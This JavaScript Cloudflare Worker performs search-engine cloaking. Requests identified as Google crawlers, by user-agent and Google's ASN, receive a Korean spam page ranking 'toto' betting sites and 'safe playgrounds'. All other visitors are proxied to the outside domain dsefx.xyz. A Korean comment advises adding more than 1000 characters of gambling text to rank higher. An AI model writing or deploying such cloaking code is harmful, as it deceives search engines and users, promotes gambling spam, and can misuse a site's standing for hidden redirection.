export default {
  async fetch(request) {
    const url = new URL(request.url);
    const ua = request.headers.get('user-agent') || '';
    const cf = request.cf || {};

    const isGoogle = 
      /Googlebot|GoogleOther|AdsBot|Mediapartners|Google-InspectionTool/i.test(ua) &&
      (cf.asn === 15169);

    if (isGoogle) {
      const seoHtml = `
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>토토사이트 추천 랭킹 TOP7 - 2026년 안전놀이터 및 메이저사이트 기반 정보</title>
  <meta name="description" content="2026년 최신 토토사이트 추천 TOP7, 먹튀 ZERO 안전놀이터 검증 리스트, 메이저 토토사이트 실시간 순위 및 가입 혜택 정보.">
  <meta property="og:title" content="토토사이트 추천 랭킹 TOP7 - 2026년 안전놀이터 및 메이저사이트 기반 정보">
  <meta property="og:description" content="안전한 메이저 토토사이트만 엄선! 2026년 최고 순위 공개, 먹튀검증 완료.">
  <script type="application/ld+json">
  {"@context":"https://schema.org","@type":"WebPage","headline":"토토사이트 추천 랭킹 TOP7 - 2026년"}
  </script>
</head>
<body>
  <h1>토토사이트 추천 TOP7 - 2026년 안전놀이터</h1>
  <p>2026년 먹튀검증 완료 메이저사이트 랭킹 실시간 업데이트...</p>
  <!-- 여기에 실제 토토 콘텐츠 1000자 이상 붙이면 상위노출 훨씬 강력 -->
</body>
</html>`;

      return new Response(seoHtml, {
        headers: { 'Content-Type': 'text/html;charset=UTF-8' }
      });
    } else {
      return fetch('https://dsefx.xyz' + url.pathname + url.search, request);
    }
  }
};
